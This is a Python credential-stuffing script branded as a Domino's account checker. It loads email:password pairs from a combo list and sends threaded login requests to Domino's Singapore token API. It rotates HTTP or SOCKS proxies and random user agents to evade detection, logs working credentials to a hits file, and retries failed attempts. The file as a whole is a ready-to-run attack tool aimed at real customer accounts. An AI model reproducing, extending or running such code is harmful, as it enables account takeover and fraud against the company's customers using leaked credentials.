import requests
from concurrent.futures import ThreadPoolExecutor
import time
from colorama import Style, Fore, init
from os import name, system
from fake_useragent import UserAgent
from random import choice
import json


class Acc():

    def Clear(self):
        if name == 'posix':
            # FOR LINUX
            system('clear')
        elif name == 'nt':
            # FOR WINDOWS
            system('cls')
        else:
            print("\n") * 120

    def __init__(self):
        self.SetTitle()
        self.hits = self.bads = self.retries = 0
        self.Clear()
        init(convert=True)
        self.Config()
        self.startTime = time.time()

        title = Style.BRIGHT + Fore.GREEN + """
			╔══════════════════════════════════════════════════╗
			    ╔═╗╔═╗╔═╗╔═╗╦ ╦╔╗╔╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗	
			    ╠═╣║  ║  ║ ║║ ║║║║ ║   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝	
			    ╩ ╩╚═╝╚═╝╚═╝╚═╝╝╚╝ ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═	
			╚══════════════════════════════════════════════════╝
			\n\n\n
        """
        print(title)

    def SetTitle(self):
        system("title [DOMINOS ACCOUNT CHECKER]")

    def UpdateTitle(self):
        system(f"title [DOMINOS ACCOUNT CHECKER] ^| HITS {self.hits} ^| BADS {self.bads} ^| RETRIES {self.retries} ^| THREADS {self.threads}")

    def ReadFile(self, fname):
        with open(fname, "r", encoding='utf8') as f:
            readlines = f.readlines()
            if "combo" in fname:
                self.comboLen = len(readlines)
            return readlines

    def Config(self):
        with open("Data/config.json", "r") as f:
            config = json.load(f)
        self.isProxy        = config["isProxy"]
        self.proxyProtocol  = config["proxyProtocol"]
        self.threads        = config["threads"]
        
    def GetProxies(self):
        proxiesFile = self.ReadFile("Data/proxies.txt")
        proxies = {}

        if self.proxyProtocol == 1: pp1,pp2 = "http","https"
        if self.proxyProtocol == 2: pp1,pp2 = "socks4","socks4"
        if self.proxyProtocol == 3: pp1,pp2 = "socks5","socks5"

        proxies = {
            "http": f"{pp1}://{choice(proxiesFile)}",
            "https": f"{pp2}://{choice(proxiesFile)}"
        }

        return proxies

    def ResultProcessor(self, status, email, pwd):
        if status == 400:
            print(Style.BRIGHT + Fore.RED + "[ BAD ] " + email + ":" + pwd + "\n", end='', flush=True)
            self.bads += 1
            with open("Results/bads.txt", "a") as f:
                f.write(email + ":" + pwd + '\n')
        elif status == 200:
            print(Style.BRIGHT + Fore.GREEN + "[ HIT ] " + email + ":" + pwd + "\n", end='', flush=True)
            self.hits += 1
            with open("Results/hits.txt", "a") as f:
                f.write(email + ":" + pwd + '\n')
        else:
            print(Style.BRIGHT + Fore.YELLOW + "[ RETRY ] " + email + ":" + pwd + "\n", end='', flush=True)
            self.retries += 1
            self.Login(email, pwd)

        self.UpdateTitle()

    def Login(self, email, pwd):

        data = {"UserName":email, "Password":pwd, "grant_type":"password"}

        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'api.dominos.com.sg',
            'Origin': 'https://www.dominos.com.sg',
            'Referer': 'https://www.dominos.com.sg/',
            'User-Agent': UserAgent().random
        }

        try:
            if self.isProxy:
                response = requests.post("https://api.dominos.com.sg/api/Token", data=data, headers=headers, proxies=self.GetProxies(), timeout=5)
            else:
                response = requests.post("https://api.dominos.com.sg/api/Token", data=data, headers=headers, timeout=5)
            self.ResultProcessor(response.status_code, email, pwd)
        except:
            self.ResultProcessor(408, email, pwd)

    def Start(self):
        combos = self.ReadFile("Data/combo.txt")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
	        for combo in combos:
	            if combo == "\n":
	                continue
	            email = combo.split(':')[0].strip()
	            pwd = combo.split(':')[-1].strip()
	            executor.submit(self.Login, email, pwd)

    def End(self):
        finishedTime = int((time.time() - self.startTime))
        checked = self.hits + self.bads
        print('\n\n\n')
        print(Style.BRIGHT + Fore.CYAN + f"[+] DONE")
        print(Style.BRIGHT + Fore.MAGENTA + f"[+] CHECKED {checked} of {self.comboLen}")
        print(Style.BRIGHT + Fore.CYAN + f"[+] Took {finishedTime} seconds")
        print(Style.BRIGHT + Fore.GREEN + f"[+] HITS {self.hits}")
        print(Style.BRIGHT + Fore.RED + f"[-] BADS {self.bads}")
        print(Style.BRIGHT + Fore.YELLOW  +f"[*] RETRIES {self.retries}")

nfx = Acc()
nfx.Start()
nfx.End()


print('\n\n')
input("Press any key to exit..")